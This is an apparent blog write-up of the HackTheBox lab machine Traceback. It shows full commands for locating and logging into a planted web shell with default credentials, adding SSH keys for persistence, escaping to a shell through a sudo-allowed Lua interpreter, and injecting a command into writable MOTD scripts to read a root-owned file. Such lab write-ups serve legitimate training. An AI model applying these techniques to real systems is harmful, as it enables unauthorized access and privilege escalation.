
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Traceback publish on Mars the 14th 2020 by Xh4H. This box is rated as easy box. It implies some Google search, a lua interpreter and a privilege escalation using the MOTD." />
<meta name="keywords" content="security, boot2root, HTB, linux">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Traceback"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Traceback publish on Mars the 14th 2020 by Xh4H. This box is rated as easy box. It implies some Google search, a lua interpreter and a privilege escalation using the MOTD."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2020/08/htb-traceback.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2020-08-19 09:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="linux"/>
  <meta property="og:image" content="">

  <title>maggick's logs &ndash; HTB: Traceback</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="../../theme/img/profile.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-traceback">HTB: Traceback</h1>
    <p>
      Posted on 19 Aug 2020 in <a href="../../category/security.html">security</a>

        &#8226; 4 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2020.08/traceback_card.png" alt="Traceback Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/233">Traceback</a> publish on
Mars the 14th 2020 by
<a href="https://www.hackthebox.com/home/users/profile/21439">Xh4H</a>.
This box is rated as easy box. It implies some Google search, a lua interpreter
and a privilege escalation using the MOTD.</p>


<h1>Foothold</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. The box is quit busy so first of all we
run a simple aggressive TCP scan:</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Thu Mar 26 04:41:18 2020 as: nmap -p- -sS -oN nmap 10.10.10.181
Nmap scan report for 10.10.10.181
Host is up (0.089s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Thu Mar 26 04:42:19 2020 -- 1 IP address (1 host up) scanned in 61.23 seconds
</code></pre></div>

<p>The open ports are:</p>
<ul>
<li>22: SSH</li>
<li>80: a web server</li>
</ul>
<p>We do not have any information to connect to the SSH server.</p>
<p>The website is a simple web page saying that the website has been hacked and
that a backdoor is available for the net.</p>
<p>Running a <code>dirb</code> or other web fuzzing tool doesn't give any result.</p>
<p><img alt="homepage" src="/media/2020.08/traceback_01.png"></p>
<p>Looking at the source code we found a commentary in the body: "Some of the best
web shells that you might need".</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>This site has been owned<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span> - Xh4H - <span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
    <span class="cm">&lt;!--Some of the best web shells that you might need ;)--&gt;</span>
  <span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</code></pre></div>

<p>The comment is the description of a <a href="https://github.com/TheBinitGhimire/Web-Shells">github repository containing
webshell</a>.</p>
<p>We generate a wordlist from the webshell of this repository and launch it
against the website with <a href="https://github.com/ffuf/ffuf">ffuf</a>.</p>
<div class="highlight"><pre><span></span><code>./ffuf -w ~/htb_traceback/Web-Shells/list -u http://10.10.10.181/FUZZ -mc 200 -c -v

        /&#39;___\  /&#39;___\           /&#39;___\
      /\ \__/ /\ \__/  __  __  /\ \__/
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
        \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

      v1.0.2
________________________________________________

:: Method           : GET
:: URL              : http://10.10.10.181/FUZZ
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200
________________________________________________

| URL | http://10.10.10.181/smevk.php
    * FUZZ: smevk.php
</code></pre></div>

<p>We go to the webshell page and found an authentication form.</p>
<p><img alt="webshell homepage" src="/media/2020.08/traceback_02.png"></p>
<p>According to Github the default credentials are "admin:admin". Once log id we
can see a few interesting information:</p>
<ul>
<li>We are the user webadmin</li>
<li>Our id is <code>1000</code> which mean we are a system user</li>
</ul>
<p><img alt="webshell homepage" src="/media/2020.08/traceback_03.png"></p>
<p>We change directory for <code>/home/webadmin/</code>. We see that there is a
<code>.ssh/authorized_keys</code> file (maybe you need to create it if this doesn't exist,
as I used the public server the folder and the file already existed).
We add our public ssh key to the file and connect using ssh.</p>
<div class="highlight"><pre><span></span><code>ssh 10.10.10.181 -lwebadmin
The authenticity of host &#39;10.10.10.181 (10.10.10.181)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.10.181&#39; (ECDSA) to the list of known hosts.
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land

Last login: Thu Mar 26 01:09:32 2020 from 10.10.17.253
webadmin@traceback:~$
</code></pre></div>

<h1>Getting user</h1>
<p>In our home folder we found a note from <code>sysadmin</code>, the other system user about
some lua tool.</p>
<div class="highlight"><pre><span></span><code>webadmin@traceback:~$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I&#39;m sure you know where to find it.
Contact me if you have any question.
</code></pre></div>

<p>Looking at our <code>sudo</code> right we have the possibility to execute <code>luvit</code> as
<code>sysadmin</code> without password.</p>
<div class="highlight"><pre><span></span><code>webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
</code></pre></div>

<p>We deduce that this is a lua interpreter and run some "Hello World" to confirm
it.</p>
<div class="highlight"><pre><span></span><code>webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit 
Welcome to the Luvit repl!
&gt; print(&quot;Hello World&quot;)
Hello World
</code></pre></div>

<p>Next we just execute <code>/bin/sh</code> using our interpreter.</p>
<div class="highlight"><pre><span></span><code>webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;/bin/sh&quot;)&#39;
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
</code></pre></div>

<p>We go to our new home directory and read <code>user.txt</code>.</p>
<div class="highlight"><pre><span></span><code>$ bash
sysadmin@traceback:~$ cd /home/sysadmin/
sysadmin@traceback:/home/sysadmin$ ls
luvit  user.txt
sysadmin@traceback:/home/sysadmin$ cat user.txt 
349f0968dce655cb15708bba0077d225
</code></pre></div>

<p>As before we add our public ssh key to the user's <code>.ssh/authorized_keys</code>.</p>
<h1>root</h1>
<p>We do not know sysadmin's password required to list our <code>sudo</code> right.</p>
<p>We run a simple <code>ps aux</code> to know which process are running. We see (that's some
luck) that root regularly execute the following command:
<code>/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/</code></p>
<div class="highlight"><pre><span></span><code>root      28855  0.0  0.0   4628   856 ?        Ss   02:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
</code></pre></div>

<p>We confirm that using <a href="https://github.com/DominicBreuker/pspy">pspy</a> (using ssh
to copy the binary).</p>
<div class="highlight"><pre><span></span><code>2020/03/26 03:07:01 CMD: UID=0    PID=29213  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 
2020/03/26 03:07:01 CMD: UID=0    PID=29212  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
</code></pre></div>

<p>When looking at the <code>/var/backups/.update-motd.d</code> folder's permissions when see
that we can not write in any file nor create a file as everything belong to
<code>root</code>. Nevertheless, the <code>/etc/update-motd.d/</code> folder's permissions allow our
user to write in any file. We create a temporary folder and add a command to the
<code>00-header</code> file. That command will copy the file <code>/root/root.txt</code> and give us
the permissions to read it.</p>
<div class="highlight"><pre><span></span><code>sysadmin@traceback:/etc/update-motd.d$ ls -al
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Mar 26 03:59 00-header
-rwxrwxr-x  1 root sysadmin  982 Mar 26 03:59 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Mar 26 03:59 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Mar 26 03:59 80-esm
-rwxrwxr-x  1 root sysadmin  299 Mar 26 03:59 91-release-upgrade
sysadmin@traceback:/etc/update-motd.d$ mkdir /tmp/ioio
sysadmin@traceback:/etc/update-motd.d$ echo &#39;cp /root/root.txt /tmp/ioio &amp;&amp; chmod 777 /tmp/ioio/root.txt&#39; &gt;&gt; 00-header
</code></pre></div>

<p>We then quickly trigger the command by initiating a new SSH connection. We can
then grab the root flag.</p>
<div class="highlight"><pre><span></span><code>ssh sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Mar 26 03:57:28 2020 from 10.10.14.2
$ cat /tmp/ioio/*
07c8a04e829b07060576e3a799a33a9d
</code></pre></div>

<h1>Wrapping up</h1>
<p>The box was quit easy and is really a nice one for beginner.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/linux.html">linux</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2020/08/vulnhub-infosec-prep-oscp.html" title="Vulnhub: InfoSec Prep: OSCP">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2020/08/htb-magic.html" title="HTB: Magic">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "",
  "description": ""
}
</script>

</body>
</html>